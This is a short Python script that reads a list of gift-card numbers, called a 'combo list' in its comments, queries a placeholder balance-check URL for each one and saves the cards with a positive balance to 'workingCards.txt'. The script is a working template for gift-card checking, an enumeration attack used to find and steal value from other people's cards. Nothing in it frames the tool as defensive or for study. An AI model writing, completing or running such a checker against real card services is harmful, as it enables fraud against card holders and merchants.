
import requests

def main():
    
    print("reading from text file....")
    numbers = getNums() #takes in combo list
    print("Sending request...")
    receivedResponse = sendRequest(numbers) #sends request and stores the json info, then parses it
    print("Printing working cardNumbers to txt file...")
    sendResponseToText = toTxt(receivedResponse) #outputs working cards to txt


    

def toTxt(receivedResponse):
    f = open("workingCards.txt","w+")
    for i in range(len(receivedResponse)):
        f.write(receivedResponse[i] + "\n")
    print("Total of '"+str(len(receivedResponse))+"' working balances outputted to file!")
    f.close()
        


def sendRequest(numbers):
    gcNumandBalance = []
    currentElement = 0;
    for i in range(len(numbers)):
        currentElement= numbers[i]
        try:
            Info = getResponse(currentElement)
            if Info != "":
                gcNumandBalance.append(Info)
                print(Info + " was added to list")
        except:
            continue
    return gcNumandBalance
        

def getResponse(currentCardNum):
    cardToInt = int(currentCardNum)
    params = (
            
            ('test', 'test'), #insert params e.g. companyID?=cla201 then it would be ('companyID','cla201')
            ('test', 'test'),
            ('cardNumber', cardToInt),
            )

    response = requests.get('url here', params=params) #target url here
    parsedInfo = jsonParse(response)
    return parsedInfo

def jsonParse(reponseInfo):
    readData = reponseInfo.json()
    info = ""
    cardBalance = readData["cardBalance"]
    cardNumber = readData["cardNumber"]
    if cardBalance > 0:
        info = "cardNumber '" + cardNumber + "' has a balance of $" + str(cardBalance) 
    return info 
    

def getNums():
    file = open("giftcards.txt","r") #must have a file named giftcards w/ valid numbers!
    giftCardArray = []
    for line in file:
        giftCardArray.append(line.strip('\n'))
    file.close()
    return(giftCardArray)


if __name__ == '__main__':
    main()
    
